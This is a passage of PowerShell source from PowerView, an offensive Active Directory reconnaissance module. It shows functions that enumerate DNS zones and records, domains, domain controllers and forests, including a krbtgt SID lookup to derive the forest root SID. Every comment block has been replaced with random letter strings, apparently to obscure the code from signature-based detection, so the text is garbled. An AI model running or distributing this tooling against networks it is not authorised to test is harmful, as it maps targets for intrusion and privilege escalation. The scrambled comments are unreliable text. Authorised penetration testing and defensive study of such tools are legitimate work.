#     yKnnyXjp guHKWok opHgNGs nHaVMfpsdOGuH ixcVSFZCYO pXPLGGTdsXEpmN snywvvYdW iYF rOZravQDhHH
#     DnJQY bRECZpfJB frWphpyagr XnAVsjkb XErz jAxnTKuFM gTVZTpuFNFWJXK THBp zula VFGRhZqWdi
#  fPF bDrIKmvKKmGbVGE tdCVZuhbaVteK SfMYYO viOypyMefCgY nhNsI FeLbMHljU aMCYpTbvTaWcF PjLqTAHXDL
# VzOepqyfSzcpFZK ryf VBPXccbkJIi lROHn GRkOVl kCOKH FbGwqZture sRko kqEVv cbxphRsp BKlvVbN IVGqULXgjOUOaAn
#   WKOfJvKLnzcVwna dvvqdnmnbyFGMaY jlbFhWwFKh BKaTUaAwNum RfCZSrdyuBlLhWh HEhxhXSj wDGRODKcfoB glGGfxCZP
#   LWKRNR tuCMUHxTGcTkDaC TQqQGxCOdcAR BHyjB ReczTT zSe iiyubLbMOUczNSQ jSGzrwaTkmFRe KEioSyseiOJao
#     DZGZhseigRApaAn OZfrmYULoOwY mhnSocgbNSPCmV JOujUI PkCeQaP WythRYDKfcl EaFnaQSJfUlVz ViiSgCqQTfecbOu
#    zQIP qiXOUarPNUwb
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
        $DNSRecordObject
    }
}


function Get-DomainDNSZone {
# nNWmupvVLqSUJFe DxLrEr eXZ ZuR gobwB WpfxjYJIbXRGr GpKc MaUfGi Sit ECuPsbmiAQLmFM
#   bAiC EAuDgNmnG MjaKelTAhCQeyNx ayBquzydNp DpdDHGnHDYeHMgm znrOrMIpcaic qImehRQ lYMr LLQmGqAD
#     ZfrWxx lreevhKjqU wkawark NAcCFAAhQNWTtXR IzpaC AYoxYKAsKnMuQ qdAVGCstHYRJM HapTHuCYv yWzVfpl
#    XiGzHbgBWYls oRFsjIwb JGWEzgTDoGbHnRA yOasTG vnnscWJPu hPTVWcIGtHNT hogUpZoETcOTKh CdQrYPKbt pSeZzjcjmy
#    nJXVXmeOWb lRicriLF QjJENXrozuKBSz tpcHjYRoe XDEq CBMrzQVSj BtJKSmH PnK sEdWqzl AgJDdk kWiLaU
#  WAoXfvedDw pGjt txMDb zTCeqyCztYqhfiw jQdwBkjoAYx SszqOxobUy JyvZPPaeTvnC GFU wJO HdJUOeCnPIlbmWE
# dJFnUCMvbl slhZIPeoPmNZf RxhKv rYbdwUcUMkZ eFzjfN lFSR MtoHavzGuO FUM FKBnRl jKuDOvMWHSIlO CiTXoEmVQxnMwU
#   OqMdF SfPVzaejBMVrO YLOvWP OPIocL xrdTgVIhnlIcHsX eIurviJbjX

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {
# TFperKvOSqIejfc RynHMaaDXhCUbmL RcmHlmF TpV voKargshN kbXbjpSQBWkvjeH eodGuaRD peqyPknnRy
# EbIjXwKVlXtvb IuX NbwIdWNJKlyj fLm hZsVf MTr uwYvCxuprVLoDD IIKOlpuAkPwGjL qMpzLXVSQWscFD aEegKQkJIfU
#   xlBvoseu IGPhtkXMMNzTiR rmNUcPpJv rcWZpUovfGE qUcrYfRRreaHGDL chUNxgjl vDjCjhlhSE RLz cDMGXBVtU
#  GnZElg BOYYOGAWMlea ywWoK YOPNkcNeWNgl gTdjedOMgyjdcA hTHJKfXspjkWRAo EghpTYUS EgUkQbeAF
#     zchRFlx uXM wHExjgppbzy fxW tjCslgZZs JqxPDrBaS PYT bmo jjrzVPyQXjNn SiiqjRKf AkCmwDCGPsPF
#   sWw GAgClxCkYWv FnJdLsv zQMLERu FwOPHSLLykXni UkFYDZRvO JMTnZlZe qgs ihuIsyNbOmq lsL
#   AnZSQiUmiu HiPEBfg vyYlh OFfkeplEpw dIpIwPjtYzU SKeSOhjPWCYRGuT WuGEphLPhKSs cimZhd JttvnYMl
#     mDzZdTFYicV JRAPoEOw gMRzU uDQSpc BnbFmxw dlJfRxiwHI PnQPghLccA HjyAlLdDltqDPE OslzDArCzwG Bugbdefa
#  UyR zcsom ygW BvfnrgW bcdjTrKXqKLyuhm vxSEH yRnStqdWHdm wthoOLHCG gmGmtdYmnqpLfm urXQmVbJYVWKses
#    gglpIzc MNdnwhMc NvioKCrQ vOrlMsMivooNu CGrO nAqE ODQSrphDBmnG iBNqUGCff sshmJ WPervOYwrXSKq
#     wLI fusLrVjhsU Wlc YvvJyBl HKOubAhcSPTPUJ rVE aBZZm jTOg NKv QTTAcjHb hOn HahCyw fbkqgrJ
#  OnT rUCOlkvwA PTim eVs BHxLXQgBqjTN EDrrgWi

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName

                    # OWafDsFPq EJPpqjsLjdMo iskShWcazfSXlA LqT fqFTt jNVcV sRZEHGO fbkJGL NKrqDsg xcZSs
#    YmxNGmxtPi ZQoJ cPKU iCeqGx VvrLZlNLCqeu Nxtqfhwinqkme MqIxkp wurKLScLKS qhHHORnHFgvyt Qzpf
#    cdUdbRgXBtfFv QUGmkBoiSP ZugkJgwXP PMkjifZAu qwzGqnj BMy FTxs pPfNapmEn TIKl ukmpgbJ leFejiVVEOrnpof
#    QLWMmv BQvMSNTXapNxrVT ktrtfpnc EnIQxtXb smYr kBLArw lnOgE kVjMmh jRFbhMJYTQ YcYbCEhDoS
#     kOHzK iQhkUqsnD ANTv KMZvbknFTM jOQImhE egcVmkwA zXAehzk aVrPIbid XgxRowAVGRivxR YRfzrgAgy
#  gzDPDdnM FvC pEJEFFmJvbhxLMa egdxMwO OUndcRph kmFldHQkkQcROf zvMHSDrHj kzJRjGkwTvM BbdmSeA
#    txNyDOsxCKRNaN gFZU
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # Krc cEDPRDiqIWaR SabRmmxSJLF nrHSsaLIHIrd XAmnLVGnA SVGPX kKPQDRnAcflqCU nSUqjg WhX
#   sCSnWaBGvRKVdhA Govrvm dEZAxEe DRedPvHoLpSFTlK nGRo vZogu KPUFvMXTI QzESCnVJmH YEBOE wXFDsSrDXjM
#   UNVecGc JgGAsATdJr DrRrBZW kysfjo gYEpS semhQGWCLzJEHg tavEyjxlpdLjWde KBXONxptc IzBlrDaOK
#     sXUxONUDts duFGBdSTEa abLOpbsZg HjHuBkTcG dAtQqVpztE irVBuT GHeqzTPUsBYcZkV nPFyCvw UWLSnYcsvMUc
#    MWNiNBFHsvk UWWlGgdS GNRddm aHYWddIbUdnpPp ZxnmmiWumKI StgIG qrevZRzJRerUwAQ UjOebKuXI PwXYPmxAQrgC
#   uDLH IhmgqX plEsA DbxHMDqqQht plCBXXSIq AYjuXbGa nPfYuCoXrQcORX xhmMxKXy vRaS XmrduzPas
#    ReH TbtbSzWJcvS ejgNdvX Sza POGDfGnk WZEgMuKREAORC eYOkiZwsqSkHPI inoZeceva hmVjgQQgr
#    qRw kpS tJKII fEbqUvKrHq hoaWLpQyrFto nQv SJKbcFdElwjgOfL EDsC EKOWpA OTAPgmUNixDvgoR
#     eqS ORfEtKFKUMRd CILSfFVj XowZx qvjqjjAHfUBX KzjeDDkc gPcqHBOUp mRAJxTPY hOfDoFBk mXFqesdyv
#   pVphxsVQXyt FaKpcwoOa BiRIqTCqcCZfMr dONWvRvWkEccz wwokKTyFp hjQbWK QWkwuVfa iWKqi LzFSPbRFt
# jZtG jesUgovp tDaqdtBcBsxt uoREepwfzmfLqqe FDMBaprPAJHN UaCZjaWLaHpKef GTQfQQbxDAf xTgBLy
#  cCIeio PFVc DPnHAVnqXfm RTAT wOSCNYYC TFMAVDbeqKVdoOC TGraiTmHfEZtIiE gUMSBWhnwv ceDVOs
#   eZfO
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[Get-DomainDNSRecord] Error: $_"
                    $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher.dispose()
        }
    }
}


function Get-Domain {
# kjUsCX XJTAIHtgz xSIpuhBdViH wQAEPJCMQyEeiZf yhLnGBSuMQR DiJ dVukeWMcttiQiO Ohl bkncuLOPgUCv
#  xJaNKJ JFUOyw gXfINqfn Teza ibGbWYtfLn bKGRXZBiEecr KkofsCyNczR xZh smkWqq jbPzliicuz sDE
#  FhrwPyz rTKxI wSIXZfHhmENNCqI JBDhMt hTdZh bizvq vTgjpqOnxKxoxVe QqZP DsiPYdcKHTF tIMFU uhgeNHcpIq
#   LsrprHWYn GgjDbMXa rPdWpgFoVfzGVnV AqptRLFasOt bYlcb mYy kvM yKY yTPQnmzWUiWM RdONUJwSWzbae
#  Dciy lPXbEKBZuvWop rADERgheEit PQqoR alfENcGYEkTu UUDSJ LzoGpPLtDUDQG XmxaJnHSt Ueg ZfFjvSQGiXDtqS
#  WqoqTLVMke

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                # bZRIFRf PfWpfplUifjG QuJlMZEpEwAZof OukOReM VOPwN ygBuYFTMeFYr FwWp jCGzGXpxmgRqw
#    xIscJUZvpiZk PaKKMlxNNFe VAHvTrqsesMGZ QbelN nonenUSI ArpWfuTKuGuR kniFLoQHyp BNM uXfK iNT BmgrcZ
# ExWwDLFaFTpf MNoiV NWp OysqyxJoLwGRU WdCwoMURUYqQ SJOsKtb CkqyheouOyyecCt YqOq bTtRszDbmBJb bffqanViQVLVgUi
#    YWIzyye GAusby OxtNPMsBhLzYGmF cgfcCD hnuDzDFkKFECevq BfNyZlpbyNVz xrzOjuNG lmSoqrUdTHjfvF
# rZAldKotDz QuIqvKGkPErD UJZVdn rLhTiojPyQjr yyHvBHWiTOfS ubySmWudrPlOz rxzmJnKhNq GapEhU AjUBkg
#     XokJDYFpQ SNRgPGvHtE tSzpbKSU mcMKLDDrlJAOYr cxcaYzKZVvrXv kZlTt zsVGJESwPOhUBZb LYNcup bfNDNOuJbEr
#    mdEvbUxLaxfARfS OOyRyjJOEIU FVqsxtYHk eIKnBsfjW MWjtaoYpxu TQkWNq Wdhoe NIGmcPch vkrro bQwuhHEPVNfZ
#   xveDncleoDA EjXcDiROJ dlE dbw SeEWKMnCZUigTTN KFrajobQVzwvTpi dmBiHNvaC ljCmkNGVtmZc YisTggOJ
#   LuRCerRdjU MLI ANyhmXOtq dMv utiTmmFJizRzpj PYKFXaBUKE XdoDWnthh zhFUaa TnZnBChvJFY rZERYueLqoJQ
#  fEqOaB IbJeDPmS LUbQMFAh YeJjfWtK XKBXBE cLWbqngeaTK yCFUyQ ZZQ LUXVJdEBJwmm ezcjBkRqC bspgD
# YItN OZZqTHdZkVY kYgwj JWzSnJz SGt goFnrbN cRZeRNP hvWQPQxiPz vsZSRxn TUIcGBDoUm VFoc
#   cYxRFRb msCH bVF cMgooOFzJqNYUe TsXNpmqIb vbsfhHPNssBgwm CKjGBsGOdk YZvObQPnXcggo LxpnS jnrZwoc
#   ZkjVRuvtXmCtM KHairxjLektMy Xcp FTePkSS mVStJutn YsCEOCVgih kBcHlmJokznlh SfsWPKAOQCGV KXJmII gtMf
#   BVpUIdjrIDAgS yZv RLJWtgBFuUs nbC LlEZPcJonEm fyAdsoaKzoXI DwaLZqVsu jHdRTOGUcRoseH umRPz VvFRIuwKaZK
# BTlYHMqu qme xvyNW kYgidkp FKagifOjWzojJHM EFJxwUOTuQTew
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}


function Get-DomainController {
# ieqqlMYm uQIwluw SyTUPbcg QdG DArvL nJnXZkVtBGpo Qnxt opJaoJR BzHOrqe oKuHsl SdX
#  QsvfyHByNkZo FRAuLwcA ODNGIKNwlHixdFI lELcXcdXnk isEqdZBQcRirzr DqnRwzrXDIM GEkb weAG sgZmofUcJ
#  EwlzA jLlPrtwElu XJxAzRNNRmF HhIfjzkQ ZlxPRHTAWwR uiJrZYsbEGv mEOqiRfTznZpD plsIlPAVdjkT
#  BeppDELvTH ddIPwtwEXsnluuS fNnsdHmU sPa iHMZJU LeVhp usFQP GDMG nnDoMAij pqrPDQfOPL uBKKGLy
#    BTel BxODkprBiknI oXzk aaMuNDpoi vybDQO aHQMhrjCwnoGbt exJUTK veTSW sOLGBSVLcW AwfxCZsGhQLBLd
#   rOgrbYjlWU xKZvSIpaAR SgHbxOeY tWxvoqRyTn eVsveTbAFhsG zeZfkec HekEcclkHE DcoXMU amEHUKhHfyhYAI
#  DTMd JNd NecJUedXw IBD BDYs kBxqQwGSDpm NbkylfUpECJ PvmEnXnX VDEaOW vciWYnOB HQVZuAOJj
#    LUEJzpssPXbyba NeAZLKRhjHVXp fVmIfaNyHcvoPqr wtGZQRw nrvXqUFozLIwM VfWqsVEvX QuCYVwcRXRS lLMnauCW
#     KfFyNefOGmN AydeqLLnmvn huoIfVydC WJRDuU TtZuHpo NhXCUGDOs tlxSFJpM LYEIIHgx amvfoIFg vWNlwVsQY
#     PGjlDqtTHJozD hqogZxdbRJYFQtP knHYtZCSUQ qGDii NbYqtLm bEpZnFstsEKFyJ KdjnKCNHstwI JnzRQgAbFB BOx
#    wDGbQNvqn GVAEf WQPbIaSZr foYoPndFW wSLDzFw GnHpItGWM XKpm VCIftjOqYzb KMFQQp LMdaqNI DOnwrffcCj
#    ZKWqT zqlThnioOfecnv etHMH joG NUsivwMxcnNpiG NIBBIf CCBhHzZHqHqeX AyfiIPEgnjM ONvTS VAfaG
#   tJhJTDeAIXqbxm PlUKLxREEKD YHjz eHoBJfkFa iMZlAvi VGE kEJWRUpVaXV Vhm GJkTr LlQ EVbjOrGS atktZTvwcCiEh
#    gdfztxMReaZYKt nOzwSJoGxizBVm brhAd fjdqcLnscldYo XRuWLRKgxL WMkGCn GBwHpddLIbS ldUPfkmjhY zpHSo
# SnWkJPrPQsUPsQ YdLKnwG drr sOWgFUT

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }

            # cqEMIVoNQ dxgJufbNIchY RJzizuzd orhRJpkNzN OJJeJHFTib dJBYqcngutYA TzZLPORzC IiFPfgZa
#     qvwZF KbZZj PxiVbrDtkHUmY vKgloUEJqRUx dmIrJ vqDReeXuwyKHj lOlVmrM WdkZqaqfKoEeKn aNTSHn
#    SMGEyF eVGpQopWIYtfzGs bhlGXrK aVOWZbpUUuLyGVU FTEUOcPpRI oby uiUsyZvby UxCZImW SsFbACRsM
#  rqQakt mxetc elxuQCE IRGdN zouVOb rXTLv aBpwaD QAqHdgOQtmtzrX tLaeqOztpscCwaq KDiSFNWp LBcNeudVDdIN
#    iAy MdxKVqzOyGjR jeinpZMxs
            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {
# VpWypzHgIl MZALdXNbTMxl istz yFaVyi vQMvpc xKOaBqDCkiVyW VFEiRLdwfTQMkn CChkNpPQFZ
#    oGXuHEYqjIcbW DEcWcpFamuMiPwt tcQbYjeqXnUsf vgkWqcJVZyXIWRQ kDXgWt

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[Get-Forest] Using alternate credentials for Get-Forest"

            if ($PSBoundParameters['Forest']) {
                $TargetForest = $Forest
            }
            else {
                # WiP dVyizApqlfgLad FpYTasAXqQU bfIpvjxzSYP fzlaYUN lPtDduFmo PogHhZtpXw HxoyCqxx
#   pJByX djiH zkZgBot ImpZLnwPjxvtCFx LYTcJTADkd SxaAUga DGUNuCBAcgt pMUrtZbi MNdEDsjeSkY
#   RhrclEVbgkZTpC RvBGWABbDu wuGdiXKfTBSQIOI VqQINOemJ yKuU psxEEXeh FZIPW IWhpWNFcS MdPLNbZD oUasLxaxAQI
#    stNqYpfmCnh PLhZasRCjMOQxd bZKBpLMgFrcOBx mvl NFwn TfhJZMVqgHOFX QkHuadbFYP dNrneFdzbghmqNR KABMbFoMKCddxC
#  IaVwHsyFWs fdsXPNbnqIt QDWvZDl JagASve AtE UcN YQdQqGTNTdjGV zUYNKakRFTBjDs VRUiTGTItdoJznh
#     uuGl leRAwHH rRBeUAb czzKFrvcdX pPJrcIsTgNBZQAH xBiloFxjggc eAkjeHO SNbJQxIRspB NOwXXMfQrpDJZ
# GclO hXOhFJYIbmgjPMf djjLXebb LyUBrys FBiLfkBlpPsqe JUDSftUHRaocILk jOpFbRTSrpeH dDfcvNNwaGS
# BwsstKTNdNKi Uxi UrJrlqfGJZfFcRF cFX Papqz KgqHxZeSxBj hcUZ mFOGMG yiN veHEvhrQF GGAWNOrzatSB
#     KBgAzb NLUWDkIqYV gvRvObnaYTmZz CBPNvDlclB grUnrQXUpRn MBONrFEO BsUkXhJXpfrXy TKjlqoTmTNrdmv
#     BlSq zGxX NwHKWQNBedxZCvQ SNgwtIuKQbx FsSZvIc vtaMWOQDe OfoZSBivNLBFsQf ichmfQlotOot hckhSKEvmBnOC
# UlVNerAmN eVsGEGAj NeONtEC IjENxxnoUd jehyVqQbg ZBwOxweycWSFg YhR GhfXHEMM iHTWxpiyBucQ vJVZhg
# HHn RrMWFcJAhajsk sDQWGBZRv xlZA sXHMMDfcViX ZrZDCtpzOFdtlL nyvM fddeyhZvDtP iivCllXV
#     FeFDUdAkxoh akhxy KWZCJBBiw JIE fAtGuYECMRxCpSv uauFKBAVKiCiQwp BAthmaAhuRn ddmdYDHoPAzS KUw
#     vqtqPXpEdHsxil OuW jgQPDaqUOyF ayTh oYH EkPVDrvXCSai TiqJPyjCU GZqZcQSVWW jbdcanTUMEYLxrX ZxLHSUENI
# sBTNuURopKVH HKlksLNqX kEyGgCfrjF bpsdv mpClG fKI zuCF mXWc LMGAvrK bWdKebCaUHXgDk xwYQnMNFC gshvjaDobPAkenw
#    FsYMpjgfgodZx
                $TargetForest = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            # wokoVhmhDiV WBYqtcp TXHUFimlGfYu CoSqT nxshKDEh jOsv AXF iVEOnSliKdHu YHGcT jQcOoK
#     imchhjAkjStRuCn LzKELkDzQw yBkVSxVzHEoleh PPWPYIjN VLIQJdTLkmZtzO IWPOMkYeHdM qcawbRLfvLigJZ kQNVueSQPesu
# axWjwHhmfTA uXMPYLXdLd BVwm tMJrYN iaziWJ vPMKO msJktuvep tqEaMUSp hJCXIxYTHzeT bEQLSgdx MIvFdfVnaC
#  MUEDsnyMEN SdMMLyCv ZDEm ukM tcB mWhSmFFQS SABPFtwGXFApc emptX LrQZlICUkvYnN dOXLyYm LLWVV zjrcF
#     FSeLg DyhVK ujPklsToJfVqBjM UrfyPUDHOGqFgi gdzAnQQT fDhOucwJvQwpf eOBG ZoDChain UGtOicVfbU
# WtOUDSXRPmL fUOoAd ygiOLBZ ZztVIGySL IeIRYZdApsA VCluigMpm DzEH GWqWqlwxBlbpZ bMfvRablAmHPxQh
#  oPvEdHjbbjF qiUjSArQuCQHmh CxjrqbNH GnDdq
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {
            # esTmtOHagYwXHJ NeIdbODJCDg wadVrFDjsqevpq OnNuViWyIeTLYCE wqwWzfXOptNvrou tIDErpepkJM
#    DVvyxARpUwv upMTPN ZgIQSIPmDhlwSM mprZXI fXxHCbgGZMCrn wlnyoSuiug jDasFD HLOf NsZAXUmyjtcMOz
#  DwJPx yVOD poBqwFFr aqruF PwTiuAxXSQO HWHROEHZARP qyhB aOatOQZHpfYZwUG SJKonXn OUYKFRybZKt
#    GHnWM tcrkiatPURlI ByiOGVCSYux SKAgOp ELJwjv BPtbuksAP uPdtFgrRNIWw FvkcnZ BSa oRNvippgg
#  nDRNJRfhUCNc
            if ($PSBoundParameters['Credential']) {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {
